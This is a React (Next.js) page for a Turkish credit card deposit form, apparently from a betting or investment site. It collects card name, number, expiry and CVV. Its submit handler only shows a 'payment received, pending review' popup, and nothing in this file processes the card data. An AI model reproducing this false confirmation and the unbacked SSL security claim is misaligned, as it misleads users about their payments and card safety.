'use client'
import Navbar from '@/components/Navbar'
import BottomNavbar from '@/components/BottomNavbar'
import Image from 'next/image'
import Link from 'next/link'
import React, { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import payment15 from "../../../assets/payment15.png"
import { getPaymentMethod } from '@/lib/adminFirebase'

const KrediKartiPaymentPage = () => {
  const router = useRouter()
  const [step, setStep] = useState(1)
  const [amount, setAmount] = useState('')
  const [showPopup, setShowPopup] = useState(false)
  const [countdown, setCountdown] = useState(5)
  const [paymentInfo, setPaymentInfo] = useState(null)
  const [loading, setLoading] = useState(true)
  const [cardNumber, setCardNumber] = useState('')
  const [expiry, setExpiry] = useState('')
  const [cvv, setCvv] = useState('')
  const [cardName, setCardName] = useState('')

  useEffect(() => {
    const fetchPaymentInfo = async () => {
      const info = await getPaymentMethod('kredi-karti')
      if (info) {
        setPaymentInfo(info)
        if (!info.enabled) router.push('/payment')
      }
      setLoading(false)
    }
    fetchPaymentInfo()
  }, [router])

  const minAmount = paymentInfo?.minAmount || 100
  const maxAmount = paymentInfo?.maxAmount || 50000000000

  useEffect(() => {
    if (showPopup && countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000)
      return () => clearTimeout(timer)
    } else if (showPopup && countdown === 0) {
      router.push('/')
    }
  }, [showPopup, countdown, router])

  const handleAmountChange = (e) => {
    const value = e.target.value.replace(/[^0-9]/g, '')
    setAmount(value)
  }

  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, '')
    value = value.replace(/(\d{4})(?=\d)/g, '$1 ')
    setCardNumber(value.substring(0, 19))
  }

  const handleExpiryChange = (e) => {
    let value = e.target.value.replace(/\D/g, '')
    if (value.length >= 2) {
      value = value.substring(0, 2) + '/' + value.substring(2, 4)
    }
    setExpiry(value.substring(0, 5))
  }

  const handleCvvChange = (e) => {
    const value = e.target.value.replace(/\D/g, '')
    setCvv(value.substring(0, 3))
  }

  const handleNext = () => {
    if (amount >= minAmount && amount <= maxAmount) setStep(2)
  }

  const handleComplete = () => setShowPopup(true)

  const quickAmounts = [100, 500, 1000, 2500, 5000, 10000]

  if (loading) {
    return (
      <div className='w-screen h-screen flex items-center justify-center bg-[#e5e6e7]'>
        <div className='animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#F7D749]'></div>
      </div>
    )
  }

  return (
    <div className='w-screen overflow-x-hidden h-auto min-h-screen pb-20'>
      <Navbar onLoginClick={() => {}} />
      <BottomNavbar />

      {showPopup && (
        <div className='fixed inset-0 bg-black/50 flex items-center justify-center z-50'>
          <div className='bg-white rounded-lg p-6 mx-4 max-w-md text-center'>
            <div className='w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4'>
              <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h3 className='text-lg font-bold text-[#3c455b] mb-2'>Ödemeniz Alınmıştır</h3>
            <p className='text-[#435061] mb-4'>İncelendikten sonra bakiyenize yansıtılacaktır.</p>
            <div className='text-sm text-[#435061]'>
              <span className='font-bold text-[#F7D749]'>{countdown}</span> saniye içinde ana sayfaya yönlendirileceksiniz...
            </div>
          </div>
        </div>
      )}

      <div className='w-full h-full bg-[#e5e6e7] md:p-10 p-1 py-7'>
        <div className='flex items-center justify-center w-full h-full bg-[#eeeeee] py-7'>
          <div className='md:w-[670px] w-full h-full bg-white flex flex-col gap-4 p-4'>
            
            <div className='flex items-center gap-3'>
              <Link href="/payment" className='text-[#546080] hover:text-[#3c455b] transition-colors'>
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                </svg>
              </Link>
              <h2 className='text-xl font-bold text-[#546080]'>Kredi Kartı ile Ödeme</h2>
            </div>

            <div className='bg-[#F4F7FA] rounded-lg p-4 flex items-center gap-4 border-2 border-[#F7D749]'>
              <Image src={payment15} className='w-[95px] h-auto' alt='Kredi Kartı logo' />
              <div className='flex flex-col'>
                <p className='text-[#3c455b] font-bold text-lg'>Kredi Kartı</p>
                <p className='text-[#435061] text-sm'>Anında işlem</p>
                <p className='text-[#435061] text-sm'>Min: ₺{minAmount.toLocaleString()} - Max: ₺{maxAmount.toLocaleString()}</p>
              </div>
            </div>

            <div className='flex items-center justify-center gap-2 my-2'>
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-white font-bold ${step >= 1 ? 'bg-[#F7D749] text-[#23272f]' : 'bg-gray-300'}`}>1</div>
              <div className={`w-16 h-1 ${step >= 2 ? 'bg-[#F7D749]' : 'bg-gray-300'}`}></div>
              <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold ${step >= 2 ? 'bg-[#F7D749] text-[#23272f]' : 'bg-gray-300 text-gray-500'}`}>2</div>
            </div>

            {step === 1 && (
              <>
                <div className='flex flex-col gap-2'>
                  <label className='text-[#3c455b] font-semibold'>Yatırım Miktarı (TRY)</label>
                  <div className='relative'>
                    <input type="text" value={amount} onChange={handleAmountChange} placeholder="Miktar giriniz..." className='w-full p-3 border-2 border-gray-200 rounded-lg focus:border-[#F7D749] focus:outline-none text-lg' />
                    <span className='absolute right-3 top-1/2 transform -translate-y-1/2 text-[#435061]'>₺</span>
                  </div>
                  {amount && (amount < minAmount || amount > maxAmount) && (
                    <p className='text-red-500 text-sm'>Miktar {minAmount.toLocaleString()} - {maxAmount.toLocaleString()} TRY arasında olmalıdır.</p>
                  )}
                </div>
                <div className='flex flex-wrap gap-2'>
                  {quickAmounts.map((quickAmount) => (
                    <button key={quickAmount} onClick={() => setAmount(quickAmount.toString())} className='px-4 py-2 bg-[#F4F7FA] border border-gray-200 rounded-lg hover:border-[#F7D749] hover:bg-[#fffbeb] transition-all text-[#3c455b] font-medium'>₺{quickAmount.toLocaleString()}</button>
                  ))}
                </div>
                <button onClick={handleNext} disabled={!amount || amount < minAmount || amount > maxAmount} className='w-full py-3 bg-[linear-gradient(86deg,rgba(212,175,55,1)_0%,rgba(255,215,0,1)_24%,rgba(255,248,220,1)_41%,rgba(255,215,0,1)_83%,rgba(212,175,55,1)_96%)] text-[#23272f] font-bold rounded-lg hover:opacity-90 transition-opacity disabled:opacity-50 disabled:cursor-not-allowed mt-4'>İlerle</button>
              </>
            )}

            {step === 2 && (
              <>
                <div className='bg-[#f0fdf4] border border-green-200 rounded-lg p-3 flex justify-between items-center'>
                  <span className='text-[#3c455b]'>Yatırılacak Miktar:</span>
                  <span className='text-green-600 font-bold text-lg'>₺{Number(amount).toLocaleString()}</span>
                </div>

                <div className='flex flex-col gap-4'>
                  <div>
                    <label className='text-[#3c455b] font-semibold text-sm'>Kart Üzerindeki İsim</label>
                    <input 
                      type="text" 
                      value={cardName}
                      onChange={(e) => setCardName(e.target.value.toUpperCase())}
                      placeholder="AD SOYAD" 
                      className='w-full p-3 border-2 border-gray-200 rounded-lg focus:border-[#F7D749] focus:outline-none mt-1'
                    />
                  </div>
                  
                  <div>
                    <label className='text-[#3c455b] font-semibold text-sm'>Kart Numarası</label>
                    <input 
                      type="text" 
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      placeholder="0000 0000 0000 0000" 
                      className='w-full p-3 border-2 border-gray-200 rounded-lg focus:border-[#F7D749] focus:outline-none mt-1 font-mono'
                    />
                  </div>

                  <div className='flex gap-4'>
                    <div className='flex-1'>
                      <label className='text-[#3c455b] font-semibold text-sm'>Son Kullanma</label>
                      <input 
                        type="text" 
                        value={expiry}
                        onChange={handleExpiryChange}
                        placeholder="AA/YY" 
                        className='w-full p-3 border-2 border-gray-200 rounded-lg focus:border-[#F7D749] focus:outline-none mt-1'
                      />
                    </div>
                    <div className='flex-1'>
                      <label className='text-[#3c455b] font-semibold text-sm'>CVV</label>
                      <input 
                        type="text" 
                        value={cvv}
                        onChange={handleCvvChange}
                        placeholder="123" 
                        className='w-full p-3 border-2 border-gray-200 rounded-lg focus:border-[#F7D749] focus:outline-none mt-1'
                      />
                    </div>
                  </div>
                </div>

                <div className='bg-[#fffbeb] border border-[#F7D749] rounded-lg p-4'>
                  <div className='flex items-start gap-3'>
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-[#d4af37] flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                    <div className='text-sm text-[#92400e]'>
                      <p className='font-bold mb-1'>Güvenli Ödeme</p>
                      <p>Kart bilgileriniz 256-bit SSL şifreleme ile korunmaktadır.</p>
                    </div>
                  </div>
                </div>

                <div className='flex gap-3'>
                  <button onClick={() => setStep(1)} className='flex-1 py-2 border-2 border-gray-300 text-[#3c455b] font-bold rounded-lg hover:bg-gray-50 transition-colors text-sm'>Geri</button>
                  <button 
                    onClick={handleComplete}
                    disabled={!cardNumber || !expiry || !cvv || !cardName}
                    className='flex-1 py-2 bg-[linear-gradient(86deg,rgba(212,175,55,1)_0%,rgba(255,215,0,1)_24%,rgba(255,248,220,1)_41%,rgba(255,215,0,1)_83%,rgba(212,175,55,1)_96%)] text-[#23272f] font-bold rounded-lg hover:opacity-90 transition-opacity text-sm disabled:opacity-50 disabled:cursor-not-allowed'
                  >
                    Ödeme Yap
                  </button>
                </div>
              </>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

export default KrediKartiPaymentPage
